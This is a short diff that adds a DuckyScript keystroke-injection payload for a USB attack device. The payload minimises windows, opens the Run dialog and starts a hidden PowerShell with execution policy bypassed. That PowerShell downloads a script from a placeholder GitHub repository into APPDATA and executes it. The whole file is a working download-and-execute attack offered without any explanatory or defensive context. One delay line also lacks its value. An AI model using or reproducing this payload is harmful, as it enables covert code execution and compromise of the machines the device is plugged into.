@@ -1,0 +1,10 @@
+DUCKY_LANG IT
+DELAY 1000
+WINDOWS m
+DELAY 1000
+WINDOWS GUI r
+DELAY
+STRING powershell -w h -NoP -NonI -Ep Bypass "echo (iwr https://raw.githubusercontent.com/your-repo/omg/main/script.ps1).content > "$env:APPDATA\c.ps1";powershell "$env:APPDATA\c.ps1""
+DELAY 2000
+ENTER
+ALT TAB
